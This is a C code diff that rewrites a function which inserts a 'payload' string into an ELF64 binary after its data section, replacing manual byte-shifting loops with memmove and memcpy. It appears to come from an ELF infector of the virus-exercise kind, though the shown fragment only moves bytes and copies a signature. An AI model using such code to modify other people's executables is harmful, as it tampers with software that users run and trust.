@@ -153,7 +153,6 @@ static int  writeToFile(const char *dirname, const char *filename, struct bfile 
 
 static int  appendSignature(struct bfile file, Elf64_Shdr *dataHeader) {
   size_t  i;
-  size_t  j;
   char    *tmp;
   size_t  toAdd;
   size_t  total;
@@ -161,17 +160,10 @@ static int  appendSignature(struct bfile file, Elf64_Shdr *dataHeader) {
   i = file.size - 1;
   tmp = (char *)file.header;
   toAdd = strlen(payload) + 1;
-  total = file.size - (dataHeader->sh_offset + dataHeader->sh_size);
-  while (i > total) {
-    tmp[i + toAdd] = tmp[i];
-    i -= 1;
-  }
-  j = 0;
-  while (j < toAdd) {
-    tmp[i + toAdd - j] = payload[toAdd - j - 1];
-    i -= 1;
-    j += 1;
-  }
+  total = file.size - (dataHeader->sh_offset + dataHeader->sh_size) - 1;
+  memmove(tmp + i + toAdd - total, tmp + i - total, total);
+  i -= total - 1;
+  memcpy(tmp + i, payload, toAdd);
   return (0);
 }
 
